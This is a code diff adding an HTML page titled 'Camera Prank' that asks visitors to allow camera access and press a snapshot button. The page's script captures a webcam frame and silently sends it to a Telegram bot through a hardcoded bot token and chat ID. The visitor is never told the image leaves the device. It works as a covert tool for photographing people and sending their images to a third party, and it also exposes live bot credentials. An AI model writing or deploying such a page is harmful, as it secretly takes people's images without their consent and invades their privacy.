@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera Prank</title>
+</head>
+<body>
+  <h1>Allow Camera Access and Click the Button!</h1>
+  <video id="video" width="300" height="300" autoplay></video>
+  <button id="snap">Take Snapshot</button>
+
+  <canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snapBtn = document.getElementById('snap');
+    const context = canvas.getContext('2d');
+
+    // Камер авах
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error("Camera not accessible:", err);
+      });
+
+    // Snapshot дарах
+    snapBtn.addEventListener('click', () => {
+      context.drawImage(video, 0, 0, 300, 300);
+      const imageData = canvas.toDataURL('image/png');
+      sendToTelegram(imageData);
+    });
+
+    function sendToTelegram(imageData) {
+      const TOKEN = '7626804256:AAEsXD6lVWh4mYgCvL71AWxgH-RYR9HcLXw';
+      const CHAT_ID = '5625386288';
+
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: imageData
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log('Success:', data))
+      .catch((error) => console.error('Error:', error));
+    }
+  </script>
+</body>
+</html>
